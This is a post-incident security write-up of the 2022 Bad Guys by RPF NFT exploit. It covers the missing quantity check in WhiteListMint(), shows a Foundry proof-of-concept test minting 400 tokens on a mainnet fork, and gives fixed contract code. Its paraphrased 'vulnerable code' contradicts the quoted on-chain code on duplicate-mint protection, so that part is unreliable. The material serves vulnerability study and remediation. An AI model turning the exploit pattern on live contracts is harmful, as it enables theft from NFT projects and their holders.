# Bad Guys by RPF — WhiteListMint Quantity Validation Missing Attack Analysis

| Field | Details |
|------|------|
| **Date** | 2022-09-22 |
| **Protocol** | Bad Guys by RPF (NFT) |
| **Chain** | Ethereum Mainnet |
| **Attack Tx** | [0xb613c68b00c532fe9b28a50a91c021d61a98d907d0217ab9b44cd8d6ae441d9f](https://etherscan.io/tx/0xb613c68b00c532fe9b28a50a91c021d61a98d907d0217ab9b44cd8d6ae441d9f) |
| **Attacker** | [0xBD8A137E79C90063cd5C0DB3Dbabd5CA2eC7e83e](https://etherscan.io/address/0xBD8A137E79C90063cd5C0DB3Dbabd5CA2eC7e83e) |
| **Vulnerable Contract (BadGuysRPF ERC721)** | [0xB84CBAF116eb90fD445Dd5AeAdfab3e807D2CBaC](https://etherscan.io/address/0xB84CBAF116eb90fD445Dd5AeAdfab3e807D2CBaC) |
| **Owner** | [0x09eFF2449882F9e727A8e9498787f8ff81465Ade](https://etherscan.io/address/0x09eFF2449882F9e727A8e9498787f8ff81465Ade) |
| **Root Cause** | No upper-bound validation on the `chosenAmount` parameter in `WhiteListMint()` |
| **CWE** | CWE-20: Improper Input Validation |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2022-09/BadGuysbyRPF_exp.sol) |

---
## 1. Vulnerability Overview

Bad Guys by RPF is an ERC721 NFT project that supported whitelist-based minting. The `WhiteListMint(bytes32[] merkleTree, uint256 chosenAmount)` function verifies whitelist membership via a Merkle proof and then mints `chosenAmount` NFTs. However, the function did not validate whether `chosenAmount` was within the permitted maximum (typically 1–3). An attacker supplied `chosenAmount = 400` alongside a valid Merkle proof and minted 400 NFTs in a single call.

---
## 2. Vulnerable Code Analysis

```solidity
// ❌ Vulnerable WhiteListMint() - no upper-bound check on chosenAmount
function WhiteListMint(
    bytes32[] calldata merkleTree,
    uint256 chosenAmount  // ❌ any value can be passed
) external payable {
    require(whiteListMintEnabled, "WhiteList minting not enabled");

    // Verify whitelist via Merkle proof
    bytes32 leaf = keccak256(abi.encodePacked(msg.sender));
    require(
        MerkleProof.verify(merkleTree, merkleRoot, leaf),
        "Not whitelisted"
    );

    // ❌ No upper-bound validation on chosenAmount
    // Intent: allow up to 3 mints per address
    // Reality: any quantity (400, 1000, etc.) can be minted

    // No duplicate-mint protection either
    _safeMint(msg.sender, chosenAmount);
}

// ✅ Correct pattern - quantity and duplicate validation
mapping(address => bool) public hasMinted;

function WhiteListMint(
    bytes32[] calldata merkleTree,
    uint256 chosenAmount
) external payable {
    require(!hasMinted[msg.sender], "Already minted");     // ✅ prevent duplicate minting
    require(chosenAmount > 0 && chosenAmount <= MAX_PER_WALLET, "Invalid amount"); // ✅ upper-bound check
    require(totalSupply() + chosenAmount <= MAX_SUPPLY, "Exceeds max supply");

    bytes32 leaf = keccak256(abi.encodePacked(msg.sender));
    require(MerkleProof.verify(merkleTree, merkleRoot, leaf), "Not whitelisted");

    hasMinted[msg.sender] = true;
    _safeMint(msg.sender, chosenAmount);
}
```

---
### On-Chain Original Code

Source: Sourcify verified


**Bad_Guys_by_RPF.sol** — entry point:
```solidity
// ❌ Root cause: no upper-bound validation on the `chosenAmount` parameter in `WhiteListMint()`
    function WhiteListMint(bytes32[] calldata _merkleProof, uint256 chosenAmount)  // ❌ unauthorized minting
        public
    {
        require(_numberMinted(msg.sender)<1, "Already Claimed");
        require(isPaused == false, "turn on minting");
        require(
            chosenAmount > 0,
            "Number Of Tokens Can Not Be Less Than Or Equal To 0"
        );
        require(
            totalSupply() + chosenAmount <= maxsupply - reserve,
            "all tokens have been minted"
        );
        bytes32 leaf = keccak256(abi.encodePacked(msg.sender));
        require(
            MerkleProof.verify(_merkleProof, rootHash, leaf),
            "Invalid Proof"
        );
        _safeMint(msg.sender, chosenAmount);
    }
```

## 3. Attack Flow (ASCII Diagram)

```
Attacker (0xBD8A...)
    │
    ├─[1] Confirm owner has enabled whitelist minting
    │       (vm.prank(owner): whiteListMintEnabled = true)
    │
    ├─[2] Construct Merkle proof array with 15 elements
    │       (valid proof including attacker's address)
    │
    ├─[3] Call WhiteListMint(merkleTree, 400)
    │       ├─ Merkle proof verification: ✅ passes (valid proof)
    │       ├─ chosenAmount validation: ❌ absent
    │       └─ 400 NFTs minted immediately
    │
    └─[4] Attacker NFT balance: 0 → 400
              133× the normal mint quantity (~3)
```

---
## 4. PoC Code (Core Logic + Comments)

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";

interface IBadGuysRPFERC721 {
    function WhiteListMint(bytes32[] calldata merkleTree, uint256 chosenAmount) external payable;
    function balanceOf(address owner) external view returns (uint256);
}

contract BadGuysRPFExploit is Test {
    IBadGuysRPFERC721 nft = IBadGuysRPFERC721(0xB84CBAF116eb90fD445Dd5AeAdfab3e807D2CBaC);
    address owner = 0x09eFF2449882F9e727A8e9498787f8ff81465Ade;
    address attacker = 0xBD8A137E79C90063cd5C0DB3Dbabd5CA2eC7e83e;

    function setUp() public {
        vm.createSelectFork("mainnet", 15_460_093);
        vm.deal(attacker, 10 ether);
    }

    function testExploit() public {
        // [Step 1] Owner enables whitelist minting
        // (In the actual attack this was already enabled)
        // vm.prank(owner);
        // nft.setWhiteListMintEnabled(true);

        emit log_named_uint("[Start] Attacker NFT balance", nft.balanceOf(attacker));

        // [Step 2] Construct valid Merkle proof array (15 elements)
        bytes32[] memory merkleTree = new bytes32[](15);
        merkleTree[0] = 0x...; // Merkle path used in the actual attack
        // ... remaining 14 paths

        // [Step 3] Call WhiteListMint with chosenAmount = 400
        // ⚡ No quantity upper-bound check → 400 mints succeed
        vm.prank(attacker);
        nft.WhiteListMint(merkleTree, 400);

        emit log_named_uint("[End] Attacker NFT balance", nft.balanceOf(attacker));
        assertEq(nft.balanceOf(attacker), 400);
        // Expected: max 3 / Actual: 400 (133× over limit)
    }
}
```

---
## 5. Vulnerability Classification (Table)

| Category | Details |
|------|-----------|
| **Vulnerability Type** | Missing Input Validation |
| **CWE** | CWE-20: Improper Input Validation |
| **OWASP DeFi** | NFT Mint Quantity Limit Bypass |
| **Attack Vector** | No upper-bound validation on the `chosenAmount` parameter |
| **Preconditions** | Valid Merkle proof, whitelist minting enabled |
| **Impact** | 400 NFTs illegitimately obtained |

---
## 6. Remediation Recommendations

1. **Enforce `chosenAmount` upper bound**: Use `require(chosenAmount <= MAX_PER_WALLET, "Exceeds max per wallet")` to enforce the per-wallet mint limit at the code level.
2. **Include quantity in the Merkle proof**: Encode the allowed quantity into the leaf — e.g., `leaf = keccak256(abi.encodePacked(msg.sender, allowedAmount))` — so only the designated quantity can be minted.
3. **Track minting state**: Record the amount already minted per address so the cumulative limit cannot be exceeded.

```solidity
// ✅ Quantity included in Merkle proof - safest pattern
mapping(address => uint256) public mintedAmount;

function WhiteListMint(
    bytes32[] calldata merkleTree,
    uint256 chosenAmount
) external payable {
    // ✅ Allowed quantity encoded in Merkle proof
    bytes32 leaf = keccak256(abi.encodePacked(msg.sender, uint256(3))); // max 3
    require(MerkleProof.verify(merkleTree, merkleRoot, leaf), "Not whitelisted");

    // ✅ Cumulative mint amount validation
    require(mintedAmount[msg.sender] + chosenAmount <= 3, "Exceeds allowance");
    mintedAmount[msg.sender] += chosenAmount;

    _safeMint(msg.sender, chosenAmount);
}
```

---
## 7. Lessons Learned

- **Thorough parameter validation**: Every user-controlled parameter must be checked to be within the expected range. In particular, parameters such as quantity, amount, and address should be validated for both minimum and maximum bounds.
- **Limitations of Merkle proofs**: A Merkle proof demonstrates that the caller is on the whitelist, but it does not guarantee the scope of permitted actions (e.g., quantity). If a quantity limit is required, the quantity information must also be included in the proof.
- **Common vulnerability in NFT projects**: Missing quantity validation in whitelist minting is a recurring vulnerability in NFT projects. Numerous similar cases were reported in 2022 alone.